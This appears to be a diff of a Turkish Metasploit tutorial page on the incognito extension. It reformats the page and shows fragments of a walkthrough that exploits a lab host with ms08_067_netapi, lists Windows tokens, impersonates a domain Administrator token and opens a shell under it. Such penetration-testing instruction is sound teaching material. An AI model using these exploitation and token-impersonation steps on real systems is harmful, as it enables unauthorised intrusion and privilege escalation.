@@ -1,20 +1,19 @@
 ---
 draft: false
-
-title:  'MSF Incognito'
-date: '2017-06-05T13:24:00+03:00'
+title: MSF Incognito
+linkTitle: MSF Incognito
+translationKey: msf-incognito
+weight: 280
+date: 2017-06-05T13:24:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-
-description:  "Bir sisteme giriş yaptığınızda, sistemde bulunan kullanıcılara ait\_token\_adı verilen izin ve yetkilendirme kuralları bulunur. Bu kurallar, web uygulamalarında kullanılan\_cookie\_denilen çerez dosyalarına benzer. Kullanıcı ağdaki bir servise (örn. Net drive) ilk bağlandığında kullanıcı adı ve parolasıyla oturum açar. Oturum açıldığında sistem bu kullanıcıya bir\_token\_tanımlar. Artık bilgisayar kapanana kadar tekrar tekrar parola girmeden, sistemde bulunan servisi kullanma imkanı olacaktır." 
- 
-url:  /tr/msf-incognito/
- 
+description: Pentest işlemleri esnasında kullanıcı token ve yetkilerini ele geçirerek kullanmaya incognito işlemi denilmektedir.
+url: /tr/msf-incognito/
 featured_image: /images/metasploit.jpg
 categories:
-    - 'Metasploit Framework'
+    - Metasploit Framework
 tags:
     - cybersecurity
-    - 'metasploit framework'
+    - metasploit framework
 ---
 ## Incognito Nedir?
 
@@ -25,16 +24,15 @@ Pentest işlemleri esnasında bu **token** ve yetkilerini ele geçirerek kullanm
 Delegate: token izinleri beyan ediciler olarak kullanılır. Etkileşimli oturumlarda, örneğin uzak masaüstü bağlantıları tarzında işlemler için kullanılırlar.
 
 Impersonate: token izinleri kişisel olarak üretilmiş izinlerdir ve etkileşim olmayan servisler için kullanılırlar. Örneğin bir ağ klasörüne bağlanmak gibi.
-<!-- wp:quote -->
-<blockquote class="wp-block-quote">
+
 Dosya sunucuları bu token izinleri için çok zengin bir bilgi kaynağıdırlar.
-</blockquote>
-<!-- /wp:quote -->
+
 Hedef sistemde bir token ele geçirdiğinizde, artık bir servise bağlanmak için o kullanıcının parolasını bilmeye gerek kalmaz çünkü yetkilendirme önceden yapılmıştır ve yetki kontrolü **token** iznine güvenilerek arka planda yapılır. Bir sistemde meterpreter shell açıldığında kullanılabilir durumda olan **token** listesi kontrol edilmelidir.
 
 ## Meterpreter Oturum Açalım
 
 Aşağıdaki örnekte, öncelikle `ms08_067_netapi` modülü kullanılarak gerekli ayarlar yapılmakta ve bir oturum açılmaktadır.
+
 ```bash
 msf > use exploit/windows/smb/ms08_067_netapi
 msf exploit(ms08_067_netapi) > set RHOST 10.211.55.140
@@ -83,6 +81,7 @@ meterpreter >
 ## Incognito Modülünü Yükleyelim
 
 Meterpreter oturumu açmayı başardıktan sonra `incognito` modülünü kullanmamız gerekiyor. `Incognito` modülü, meterpreter e ait bir modül olduğundan `use incognito` komutuyla modülü aktif hale getiriyoruz. Ardından `help` komutunu verdiğinizde, `incognito` modülüne özel komutları görebiliriz.
+
 ```bash
 meterpreter > use incognito
 Loading extension incognito...success.
@@ -106,6 +105,7 @@ meterpreter >
 ## Sistemdeki token Listesi
 
 Meterpreter içerisinde `incognito` modülünü yükledikten sonra `list_tokens` komutuyla listeyi kontrol edelim. Listede bulunan bir takım **token** izinlerine Administrator kullanıcılarının bile erişimi olmayabilir. Bizim en fazla ilgileneceğimiz tür **SYSTEM** token izinleridir.
+
 ```bash
 meterpreter > list_tokens -u
 
@@ -124,6 +124,7 @@ meterpreter >
 ```
 
 Yukarıda listede bulunan `SNEAKS.IN\Administrator` isimli token fark ettiyseniz **Delegation** listesinde bulunmaktadır. Bunu **Impersonation** haline getirerek kişiselleştirmeniz gerekmektedir. Bunun için `impersonate_token` komutunu kullanacağız. Komutu girerken iki adet `\\` işareti kullanmaya dikkat edin. Listede `\` tek olsa da komutu girerken iki adet girilmelidir.
+
 ```bash
 meterpreter > impersonate_token SNEAKS.IN\\Administrator
 [+] Delegation token available
@@ -138,6 +139,7 @@ Komut başarıyla sonlandığında `getuid` komutuyla kullanıcı kimliğini kon
 ## Yeni Kullacı ile Shell Açma
 
 Meterpreter içerisinde `execute -f cmd.exe -i -t` komutu ile komut satırında oturum açalım ve `whoami` komutuyla Windows kullanıcı kimliğine bakalım. Burada `-i` seçeneği **interact*** yani etkileşimli, `-t` seçeneği ise yeni ele geçirdiğimiz `SNEAKS.IN\Administrator` token iznini kullanmayı ifade eder.
+
 ```bash
 meterpreter > shell
 Process 2804 created.
